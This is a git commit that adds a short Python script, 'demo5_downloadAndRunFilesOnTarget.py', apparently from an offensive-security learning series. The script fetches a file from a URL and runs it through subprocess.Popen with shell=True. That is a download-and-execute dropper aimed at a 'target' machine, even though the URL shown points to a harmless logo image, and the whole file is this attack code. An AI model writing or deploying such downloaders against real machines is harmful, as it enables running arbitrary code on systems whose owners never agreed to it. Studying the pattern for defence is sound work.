06deb7844cae00aeabee37dbe1534b2a8b5a3fa2
Mahnoor Anjum <manomaq@gmail.com>
2020-04-28 01:24:03 +0500

    added demo5

---
+++ demo5_downloadAndRunFilesOnTarget.py
@@ -0,0 +1,17 @@
+#!usr/bin/env python
+import requests
+import subprocess
+
+fname = ""
+def download(url):
+    global fname 
+    fname = url.split("/")[-1]
+    get_request = requests.get(url)
+    print(get_request)
+    with open(fname, "wb") as output_file:
+        output_file.write(get_request.content)
+    
+
+download("https://upload.wikimedia.org/wikipedia/en/1/11/Punk%27d_logo.jpg")
+command = fname
+subprocess.Popen(command, shell=True)
